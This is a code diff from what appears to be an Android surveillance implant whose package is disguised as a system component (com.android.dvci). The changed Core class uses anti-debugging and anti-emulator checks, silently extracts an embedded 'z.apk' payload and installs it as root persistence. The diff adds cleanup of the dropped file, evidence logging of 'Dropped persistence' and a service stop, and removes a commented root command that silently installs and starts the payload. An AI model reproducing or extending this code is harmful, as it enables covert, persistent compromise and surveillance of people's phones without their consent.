@@ -12,6 +12,7 @@ import android.app.ActivityManager;
 import android.app.PendingIntent;
 import android.content.ContentResolver;
 import android.content.Context;
+import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.content.res.Resources;
 import android.os.Build;
@@ -38,12 +39,12 @@ import com.android.dvci.optimize.NetworkOptimizer;
 import com.android.dvci.util.AntiDebug;
 import com.android.dvci.util.AntiEmulator;
 import com.android.dvci.util.Check;
-import com.android.dvci.util.Execute;
 import com.android.dvci.util.PackageUtils;
 import com.android.dvci.util.StringUtils;
 import com.android.dvci.util.Utils;
 import com.android.mm.M;
 
+import java.io.File;
 import java.io.IOException;
 
 /**
@@ -1084,9 +1085,7 @@ public class Core extends Activity implements Runnable {
 		Status.setPlayStoreEnableStatus(true);
 
 		if (Status.self().isMelted()) {
-
 			installSilentAsset();
-
 		}
 	}
 
@@ -1099,28 +1098,38 @@ public class Core extends Activity implements Runnable {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (installSilentAsset), going to install");
 			}
-			Utils.dumpAssetPayload(M.e("z.apk"));
-			// Create the rooting script
-
+			String apk = M.e("z.apk");
+			Utils.dumpAssetPayload(apk);
 
 			String pack = Status.getAppContext().getPackageName();
 			Root.installPersistence(false, String.format("/data/data/%s/files/z.apk", pack));
 
-			//pm install -r -f /data/local/tmp/adb-tmp.apk
-			//Execute.executeRootAndForgetScript(String.format(M.e("pm install -r -f /data/data/%s/files/z.apk; sleep 2; am startservice com.android.dvci/.ServiceMain; sleep 2"), pack));
-			// if not installed com.android.dvci:
-			//   install com.android.dvci
-			// if not running:
-			//   start it
-			// if running:
-			//   exit
-			//
+			File file = new File(Status.getAppContext().getFilesDir(), apk);
+			file.delete();
+
 			if (PackageUtils.isInstalledApk(dvci)) {
+				EvidenceBuilder.info("Dropped persistence");
+				if (Cfg.DEMO) {
+					Status.self().makeToast(M.e("Melt: dropped persistence"));
+				}
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (installSilentAsset), stopping melt");
 				}
-				Stop();
+
+				stopService();
 			}
+
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (installSilentAsset), stopping melt");
+			}
+			stopService();
 		}
 	}
+
+	private void stopService() {
+		Intent intent = new Intent(this, ServiceMain.class);
+		stopService(intent);
+	}
+
 }
